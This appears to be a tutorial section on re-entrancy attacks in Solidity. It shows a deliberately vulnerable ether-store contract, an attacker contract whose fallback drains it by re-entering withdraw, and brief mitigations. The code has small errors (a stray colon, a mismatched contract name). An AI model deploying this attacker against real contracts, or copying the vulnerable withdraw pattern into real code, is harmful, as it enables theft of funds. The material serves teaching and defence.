## Re-entrancy

Re-entrancy attack can be seen as situation where a contract B calls back into another contract A while Contract A is still executing some code logic.
On a high overview, reentrancy attacks majorly happens when state changes are not updated before making external calls, thereby enabling an external contract to keep entering back into an executing function and possibly draining the funds in the contract

```

pragma solidity 0.6.8;

contract Etherstore{
    mapping(address => uint) public balances:

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public{
        require(balances[msg.sender] >= _amount);

        (bool sent,) = msg.sender.call{value: _amount}("");
        require(sent, "failed to send ether");
        balances[msg.sender]-= _amount;
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}


/*Attacking Contract*/

pragma solidity 0.6.8;

contract Attack{
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public{
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable{
        if (address(etherStore).balance >= 1 ether){
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable{
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }
}

```

#### Mitigation
A common pattern to use against re-entrancy is the check-effect-pattern which ensures that state changes are updated before making external calls
Another solution is using a guard, which ensures that a single function is run to completion before executing another